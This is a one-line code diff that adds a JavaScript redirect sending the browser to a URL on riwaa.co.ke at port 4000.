@@ -1,0 +1,1 @@
+window.location.href = "https://riwaa.co.ke:4000"
